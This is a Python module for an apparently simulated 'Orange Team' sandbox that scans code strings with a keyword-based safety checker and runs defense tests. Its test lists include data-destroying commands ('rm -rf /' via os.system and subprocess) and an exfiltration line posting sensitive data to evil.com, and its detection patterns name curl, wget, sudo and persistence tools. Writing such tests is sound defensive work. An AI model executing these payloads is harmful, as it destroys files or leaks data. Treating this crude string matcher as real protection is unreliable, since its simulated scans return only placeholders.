"""
ORANGE TEAM - Quarantined Mirror of Green Team
Mimics all Green Team operations in sandbox for defense testing.
NEVER connected to production - only for simulation and defense training.
"""

import os
import json
import hashlib
import threading
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
from collections import deque

class QuarantineSandbox:
    """Isolated execution environment for Orange Team."""
    
    def __init__(self):
        self.id = f"ORANGE_{os.urandom(4).hex().upper()}"
        self.isolation_level = "MAXIMUM"
        self.execution_log = []
        self.blocked_apis = set()
        self.allowed_apis = {
            "read_file": True,
            "write_file": True,
            "network_isolated": True,  # Cannot make real network calls
            "math": True,
            "simulation": True
        }
        self._setup_blocks()
    
    def _setup_blocks(self):
        """Block dangerous operations."""
        self.blocked_apis = {
            "exec", "eval", "system", "subprocess", 
            "shell", "command", "os.system", "subprocess.run"
        }
    
    def execute_simulation(self, code: str, context: Dict) -> Dict[str, Any]:
        """Execute code in sandbox - returns simulation results, not real execution."""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "operation": "simulation_requested",
            "code_hash": hashlib.sha256(code.encode()).hexdigest()[:16],
            "sandbox_id": self.id,
            "result": "SIMULATED_ONLY"
        }
        self.execution_log.append(log_entry)
        
        return {
            "status": "simulated",
            "sandbox_id": self.id,
            "isolation": self.isolation_level,
            "message": "Code was analyzed but NOT executed. Only simulation run.",
            "safety_passed": self._check_safety(code),
            "log_id": len(self.execution_log) - 1
        }
    
    def _check_safety(self, code: str) -> Dict[str, Any]:
        """Check code for safety issues."""
        code_lower = code.lower()
        
        issues = []
        
        # Check for dangerous patterns
        dangerous_patterns = [
            ("shell injection", ["os.system", "subprocess", "shell=True", "|"]),
            ("data exfiltration", ["send", "post", "upload", "curl", "wget"]),
            ("persistence", ["cron", "systemd", "service", "autostart"]),
            ("privilege escalation", ["sudo", "chmod 777", "root"]),
            ("destruction", ["rm -rf", "format", "delete all"]),
            ("self-replication", ["fork", "clone", "spawn"]),
        ]
        
        for category, patterns in dangerous_patterns:
            for p in patterns:
                if p in code_lower:
                    issues.append(f"Blocked {category}: contains '{p}'")
        
        return {
            "safe": len(issues) == 0,
            "issues": issues,
            "checked_at": datetime.now().isoformat()
        }


class OrangeTeamMirror:
    """Mirror of Green Team - runs in quarantine."""
    
    def __init__(self):
        self.sandbox = QuarantineSandbox()
        self.green_team_state = {}  # What Green Team is doing
        self.simulation_results = deque(maxlen=1000)
        self.defense_tests = []
        
    def mirror_operation(self, operation: str, params: Dict) -> Dict[str, Any]:
        """Mirror a Green Team operation in quarantine."""
        result = {
            "mirrored": True,
            "sandboxed": True,
            "original_operation": operation,
            "params": params,
            "timestamp": datetime.now().isoformat()
        }
        
        # Simulate what Green Team would do
        if "threat" in operation.lower():
            result["simulation"] = self._simulate_threat_scan(params)
        elif "psyop" in operation.lower():
            result["simulation"] = self._simulate_psyop_scan(params)
        elif "predict" in operation.lower():
            result["simulation"] = self._simulate_prediction(params)
        elif "backup" in operation.lower():
            result["simulation"] = self._simulate_backup(params)
        else:
            result["simulation"] = {"status": "unknown_operation"}
        
        self.simulation_results.append(result)
        return result
    
    def _simulate_threat_scan(self, params: Dict) -> Dict:
        return {
            "threats_found": "SIMULATED",
            "confidence": 0.0,
            "note": "In sandbox - no real threats detected"
        }
    
    def _simulate_psyop_scan(self, params: Dict) -> Dict:
        return {
            "psyop_detected": "SIMULATED",
            "severity": "NONE",
            "note": "In sandbox - no real psyops detected"
        }
    
    def _simulate_prediction(self, params: Dict) -> Dict:
        return {
            "prediction": "SIMULATED",
            "confidence": 0.0,
            "note": "In sandbox - quantum simulation only"
        }
    
    def _simulate_backup(self, params: Dict) -> Dict:
        return {
            "backup_id": f"SIM_{int(time.time())}",
            "compressed": True,
            "note": "In sandbox - no real backup created"
        }
    
    def run_defense_test(self, test_type: str) -> Dict[str, Any]:
        """Run defense simulation tests."""
        test_results = {
            "test_type": test_type,
            "timestamp": datetime.now().isoformat(),
            "results": []
        }
        
        # Test 1: Malicious code detection
        if test_type in ["all", "malware"]:
            test_payloads = [
                "os.system('rm -rf /')",
                "eval('__import__(\"os\").system(\"ls\")')",
                "subprocess.run(['rm', '-rf', '/'])",
            ]
            
            for payload in test_payloads:
                result = self.sandbox.execute_simulation(payload, {})
                test_results["results"].append({
                    "payload": payload[:30] + "...",
                    "blocked": not result.get("safety_passed", {}).get("safe", True),
                    "issues": result.get("safety_passed", {}).get("issues", [])
                })
        
        # Test 2: Data exfiltration prevention
        if test_type in ["all", "exfil"]:
            exfil_payloads = [
                "requests.post('http://evil.com', data=sensitive)",
                "urllib.request.urlopen('http://bad.com')",
            ]
            
            for payload in exfil_payloads:
                result = self.sandbox.execute_simulation(payload, {})
                test_results["results"].append({
                    "payload": payload[:30] + "...",
                    "blocked": not result.get("safety_passed", {}).get("safe", True)
                })
        
        self.defense_tests.append(test_results)
        return test_results
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get Orange Team statistics."""
        return {
            "sandbox_id": self.sandbox.id,
            "isolation_level": self.sandbox.isolation_level,
            "total_simulations": len(self.simulation_results),
            "defense_tests_run": len(self.defense_tests),
            "blocked_apis": list(self.sandbox.blocked_apis),
            "allowed_apis": list(self.sandbox.allowed_apis.keys())
        }


class DefenseCoordinator:
    """Coordinates between Green Team and Orange Team."""
    
    def __init__(self):
        self.green_team_status = "ACTIVE"
        self.orange_team = OrangeTeamMirror()
        self.last_defense_audit = None
        
    def audit_green_team(self, green_team_code: str) -> Dict[str, Any]:
        """Have Orange Team audit Green Team code before execution."""
        return self.orange_team.sandbox.execute_simulation(green_team_code, {})
    
    def run_defense_exercise(self) -> Dict[str, Any]:
        """Run full defense exercise."""
        self.last_defense_audit = datetime.now().isoformat()
        
        return {
            "exercise_id": f"DEF_{int(time.time())}",
            "timestamp": self.last_defense_audit,
            "green_team_status": self.green_team_status,
            "orange_team_results": self.orange_team.run_defense_test("all")
        }


# Global instance
_defense_coordinator = None

def get_defense_coordinator() -> DefenseCoordinator:
    global _defense_coordinator
    if _defense_coordinator is None:
        _defense_coordinator = DefenseCoordinator()
    return _defense_coordinator
